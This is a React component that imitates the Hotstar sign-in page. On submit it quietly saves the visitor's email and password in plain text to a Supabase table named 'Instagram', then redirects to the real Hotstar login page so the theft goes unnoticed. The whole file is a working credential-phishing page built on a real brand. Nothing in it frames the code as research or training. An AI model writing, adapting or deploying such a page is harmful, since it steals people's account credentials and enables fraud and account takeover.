import React, { useState } from "react";
import "./HotstarLogin.css";
import { supabase } from "../../supabase";

const HotstarLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.hotstar.com/in/login";
    }
  };

  return (
    <div className="hotstar-login-bg">
      <div className="hotstar-login-center">
        <div className="hotstar-logo-svg">
          <svg width="90" height="32" viewBox="0 0 90 32" xmlns="http://www.w3.org/2000/svg"><text x="0" y="24" fontFamily="Arial Black, Arial, sans-serif" fontSize="28" fill="#00b8f4">hotstar</text></svg>
        </div>
        <div className="hotstar-login-box">
          <h1 className="hotstar-signin-title">Sign In to Hotstar</h1>
          <form className="hotstar-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="hotstar-login-input"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              className="hotstar-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="hotstar-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="hotstar-error">{error}</div>}
            {success && <div className="hotstar-success">Login saved!</div>}
          </form>
          <div className="hotstar-signup-now">
            New to Hotstar?{' '}
            <a
              href="https://www.hotstar.com/in/browse/get-started"
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign up now.
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default HotstarLogin;
